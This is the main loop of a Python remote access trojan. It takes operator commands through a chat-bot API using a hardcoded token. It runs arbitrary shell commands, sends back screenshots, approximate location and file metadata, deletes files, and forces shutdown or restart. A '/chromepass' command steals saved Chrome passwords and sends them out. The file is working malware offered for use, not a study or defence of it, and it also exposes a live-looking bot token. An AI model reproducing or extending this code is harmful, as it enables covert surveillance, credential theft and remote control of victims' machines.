from libs import location
from libs import metadata
from libs import screenshot
from libs import shell
from libs import binaryexec
from libs import report
from libs import soundplay
from libs import clipboardgrab
from libs import winpop
from libs import chromepass  # <-- Added for Chrome password stealing
from classes import message
from classes import API
import os
import time

# Insert your API token here
apiCalls = API.API("7979593843:AAHzOvyLCvYFHuSLQDtKDas4LQKfGh0wxlM")

last_message_id = None

while True:
    try:
        commandObj = apiCalls.GetMessage()
        if commandObj is not None:
            current_message_id = commandObj.MessageID()
            if current_message_id != last_message_id:
                last_message_id = current_message_id
                fullCommand = commandObj.MessageText()
                commandSplit = fullCommand.split(" ")

                if commandSplit[0] == "/whoami":
                    out = shell.executeSysCmd("cmd.exe /c whoami", "", True)
                    apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), out)

                elif commandSplit[0] == "/screenshot":
                    print("[+] Checking length of /screenshot command...")
                    if len(commandSplit) < 2:
                        print("[!] Screenshot requires at least 2 arguments. Sending error back to operator...")
                        apiCalls.ErrorLogger(
                            commandObj.ChatID(),
                            "/screenshot command requires at least 2 arguments. Example: /screenshot 2 <- to take 2 screenshots"
                        )
                    else:
                        print("[+] Sufficient length. Taking screenshots...")
                        shotLocation = screenshot.takeScreenshot(commandSplit[1])
                        for i in shotLocation:
                            print(f"[+] Sending screenshot from {i} to operator...")
                            apiCalls.UploadPhoto(commandObj.ChatID(), i)
                            os.remove(i)

                elif commandSplit[0] == "/location":
                    locationData = location.locationSnab()
                    print("[+] Sending approx. location data to operator...")
                    apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), locationData)

                elif commandSplit[0] == "/metadata":
                    print("[+] Checking length of /metadata command...")
                    if len(commandSplit) < 2:
                        print("[!] /metadata command is of insufficient length!")
                        apiCalls.ErrorLogger(
                            commandObj.ChatID(),
                            "/metadata command requires at least 2 arguments. Example: /metadata C:\\Users\\User17\\Files\\Important.docx"
                        )
                    else:
                        print(f"[+] Gathering metadata from {commandSplit[1]}...")
                        fileData = metadata.retrieveMetadata(commandSplit[1])
                        print("[+] Sending metadata back to operator...")
                        apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), fileData)

                elif commandSplit[0] == "/execute":
                    print("[+] Checking length of /execute command...")
                    if len(commandSplit) < 3:
                        print("[!] /execute command is of insufficient length!")
                        apiCalls.ErrorLogger(
                            commandObj.ChatID(),
                            "/execute command requires 3 arguments: /execute dir [/b,/c]"
                        )
                    else:
                        if commandSplit[2] == "noargs" or commandSplit[2] == "none":
                            commandOutput = shell.executeSysCmd(commandSplit[1], "", True)
                            if str(commandOutput).startswith("Error"):
                                print("[!] Error encountered in executeSysCmd function. Fwding to operator...")
                                apiCalls.ErrorLogger(commandObj.ChatID(), commandOutput)
                            else:
                                print(f"[+] Sending output of {commandSplit[1]} to operator...")
                                apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), commandOutput)
                        else:
                            commaSplitArgs = commandSplit[2][1:len(commandSplit[2])-1].split(",")
                            commandOutput = shell.executeSysCmd(commandSplit[1], commaSplitArgs)
                            if str(commandOutput).startswith("Error"):
                                print("[!] Error encountered in executeSysCmd function. Fwding to operator...")
                                apiCalls.ErrorLogger(commandObj.ChatID(), commandOutput)
                            else:
                                print(f"[+] Sending output of {commandSplit[1]} to operator...")
                                apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), commandOutput)

                elif commandSplit[0] == "/power":
                    print("[+] Checking length of /power command...")
                    if len(commandSplit) < 2:
                        print("[+] Insufficient length of command! Power requires 1 argument which would be pd, hibernate, or restart")
                        apiCalls.ErrorLogger(
                            commandObj.ChatID(),
                            "Insufficient length of arguments passed to /power command. Requires 1 argument which would be: shutdown, hibernate, or restart"
                        )
                    else:
                        if commandSplit[1] == "hibernate":
                            shell.executeSysCmd("cmd.exe /c shutdown /f /h", "", True)
                        elif commandSplit[1] == "pd":
                            shell.executeSysCmd("cmd.exe /c shutdown /f /s", "", True)
                        elif commandSplit[1] == "restart":
                            shell.executeSysCmd("cmd.exe /c shutdown /f /r", "", True)
                        else:
                            apiCalls.ErrorLogger(commandObj.ChatID(), "Invalid argument passed to the /power command.")

                elif commandSplit[0] == "/ls":
                    print("[+] Directory listing command received")
                    if len(commandSplit) < 2:
                        print("[!] No arguments received, returning directory listing for current directory")
                        dirListing = shell.executeSysCmd("cmd.exe /c dir /q", "", True)
                        apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), dirListing)
                    else:
                        print("[+] Argument received. Returning directory listing for specified directory")
                        dirListing = shell.executeSysCmd("cmd.exe /c dir /q", commandSplit[1], False)
                        apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), dirListing)

                elif commandSplit[0] == "/delete":
                    print("[+] Delete command received")
                    if len(commandSplit) < 2:
                        apiCalls.ErrorLogger(
                            commandObj.ChatID(),
                            "Insufficient number of arguments for /delete command! /delete requires 1 argument which is the path to the file to delete"
                        )
                    else:
                        shell.executeSysCmd("cmd.exe /c del", commandSplit[1], False)

                elif commandSplit[0] == "/chromepass":
                    print("[+] Chrome password stealer command received")
                    result = chromepass.steal_chrome_passwords()
                    if result:
                        apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), result)
                    else:
                        apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), "No passwords found or error occurred.")

                # ... Add any other commands here ...

                else:
                    apiCalls.ErrorLogger(commandObj.ChatID(), "Command not available!")

            else:
                # Already processed this message, skip it
                pass
        else:
            print("[!] No command received. Waiting for input...")
        time.sleep(2)

    except Exception as e:
        print(f"[!] Exception occurred: {e}")
        try:
            if commandObj is not None:
                apiCalls.ErrorLogger(commandObj.ChatID(), f"Exception occurred: {e}")
        except Exception:
            pass
        time.sleep(2)
